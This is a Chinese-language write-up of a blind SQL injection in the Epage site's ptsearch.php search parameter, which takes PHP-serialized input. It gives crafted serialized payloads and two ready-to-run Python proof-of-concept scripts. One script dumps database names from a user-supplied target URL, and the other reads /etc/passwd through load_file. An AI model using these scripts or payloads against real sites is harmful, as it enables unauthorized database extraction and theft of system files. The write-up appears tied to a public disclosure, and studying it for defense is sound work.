Epage sql 注入漏洞
==================

一、漏洞简介
------------

二、漏洞影响
------------

三、复现过程
------------

将单引号用来站内搜寻时发现不可注入，正准备放弃时发现搜索结果的第N页的连结中使用了php序列刚好最近学到php序列不安全，未检查的情况下unserialize后会造成许多问题，甚至RCE看了一下序列的长相是否有机可称：

    wc=a:3:{s:3:"Key";s:4:"test";s:8:"pagesize";s:2:"10";s:3:"Rcg";i:0;}

嗯，是一个序列化过的array，里面的key竟然是我刚才的输入！？试试注入单引号，失败，准备放弃QQ我的输入会显示出来\...\...，那试试XSS好了蛤，报错！？原来没有过滤双引号啊而且还回显了完整的sql语句开始闭合语句

透过构造

    a:3:{s:3:"Key";s:42:""and(substring(version(),1,1)="5")and"%"="";s:8:"pagesize";s:2:"10";s:3:"Rcg";i:0;}

查无资料

透过构造

    a:3:{s:3:"Key";s:42:""and(substring(version(),1,1)="5")and"%"="";s:8:"pagesize";s:2:"10";s:3:"Rcg";i:0;}

显示查询，以此类推

透过构造

    a:3:{s:3:"Key";s:42:""and(substring(version(),3,1)="0")and"%"="";s:8:"pagesize";s:2:"10";s:3:"Rcg";i:0;}

显示查询

透过构造

    a:3:{s:3:"Key";s:42:""and(substring(version(),5,1)="8")and"%"="";s:8:"pagesize";s:2:"10";s:3:"Rcg";i:0;}

显示查询

证明存在Boolean Based Blind Injection漏洞，mysql版本为5.0.8

### poc1 retrive database

> 可通过poc解析server上的database名称与版本> 同理也可以进一步dump出每个栏位的资料

此外网站也有权限可以load\_file（outfile试不出来，可能是没权限或我太菜了QQ）

    import requests
    import time

    print("Blind SQL injection in php Serialize POC")
    url=input("Target url:")
    url += "/bin/ptsearch.php?wc=a:3:{s:3:\"Key\";s:@:\"*\";s:8:\"pagesize\";s:2:\"10\";s:3:\"Rcg\";i:0;}"

    print("start parsing")
    print("")
    print("MYSQL version:")
    for i in range(1,10,2):
    for k in range(0,10):
    session = requests.Session()
    closed_sql='\"and({inject})and\"%\"=\"'
    inject_sql= closed_sql.format(inject="substring(version(),{i},1)=\"{k}\"")
    inject_sql= inject_sql.format(i=i,k=k)
    inject_url=url.replace("@",str(len(inject_sql)))
    inject_url=inject_url.replace("*",inject_sql)
    r = session.get(inject_url)
    r.encoding = 'utf-8'

        if("未找到符合條件的資料" not in r.text):
            print(k,end=".")
    print("version detect complete,take a break...........")
    print()
    print()
    time.sleep(5)

    print("parsing lenth of available database..............")
    all_valid_database=0
    for i in range(1,50):
    session = requests.Session()
    closed_sql='\"and({inject})and\"%\"=\"'
    inject_sql= closed_sql.format(inject="(ascii(substring((select(group_concat(schema_name))from(information_schema.schemata)),{i},1)))>0")
    inject_sql= inject_sql.format(i=i)
    inject_url=url.replace("@",str(len(inject_sql)))
    inject_url=inject_url.replace("*",inject_sql)
    r = session.get(inject_url)
    r.encoding = 'utf-8'
    if("未找到符合條件的資料" in r.text):
    all_valid_database = i
    print(all_valid_database)
    break

    print("parsing finish,take a break")
    time.sleep(3)

    print("start parsing available database")
    print("available database:")
    for i in range(1,all_valid_database):
    time.sleep(2)
    for k in range(32,126):
    session = requests.Session()
    closed_sql='\"and({inject})and\"%\"=\"'
    inject_sql= closed_sql.format(inject="(ascii(substring((select(group_concat(schema_name))from(information_schema.schemata)),{i},1)))>{k}")
    inject_sql= inject_sql.format(i=i,k=k)
    inject_url=url.replace("@",str(len(inject_sql)))
    inject_url=inject_url.replace("*",inject_sql)
    r = session.get(inject_url)
    r.encoding = 'utf-8'

        if("未找到符合條件的資料" in r.text):
            if (k==44):
                print(chr(k),end="")
                print()
            else:
                print(chr(k),end="")
            break

### poc2 load etc/passwd

    import requests
    import time

    print("Blind SQL injection in php Serialize POC")
    url=input("Target url:")
    url += "/bin/ptsearch.php?wc=a:3:{s:3:\"Key\";s:@:\"*\";s:8:\"pagesize\";s:2:\"10\";s:3:\"Rcg\";i:0;}"

    print("start parsing")
    print("")

    all_valid_database=1436#如上一個poc的找法，但這次手動二分搜尋法xd，怕用程式跑，太密集會被server擋掉

    print("start parsing available file")
    print("etc/passwd:")
    for i in range(1,all_valid_database):
    time.sleep(2)
    for k in range(32,126):
    session = requests.Session()
    closed_sql='\"and({inject})and\"%\"=\"'
    inject_sql= closed_sql.format(inject="(ascii(substring((select(load_file(\"/etc/passwd\"))),{i},1)))>{k}")
    inject_sql= inject_sql.format(i=i,k=k)
    inject_url=url.replace("@",str(len(inject_sql)))
    inject_url=inject_url.replace("*",inject_sql)
    r = session.get(inject_url)
    r.encoding = 'utf-8'
    if("未找到符合條件的資料" in r.text):
    print(chr(k),end="")
    break

1.png

2.png

3.png

参考链接
--------

> https://zeroday.hitcon.org/vulnerability/ZD-2020-00601
